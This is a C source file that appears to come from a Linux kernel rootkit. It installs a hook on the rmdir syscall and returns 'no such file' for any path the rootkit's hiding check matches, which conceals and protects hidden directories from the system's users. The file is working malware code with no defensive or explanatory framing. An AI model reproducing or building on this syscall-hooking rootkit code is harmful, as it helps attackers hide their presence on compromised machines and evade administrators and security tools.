#include "../inc/hooks.h"
#include "../inc/util.h"

#include <linux/module.h>
#include <linux/namei.h>
#include <linux/path.h>

void *_rmdir = NULL;

asmlinkage int64_t h_rmdir(const struct pt_regs *r) {
  const char __user *pn = (void *)r->di;
  struct path        pn_path;
  int64_t            ret = 0;

  hfind(_rmdir, "__x64_sys_rmdir");

  if (user_path_at(AT_FDCWD, pn, LOOKUP_FOLLOW, &pn_path) != 0)
    goto end;

  if (should_hide_path(&pn_path))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_rmdir);

  return ret;
}
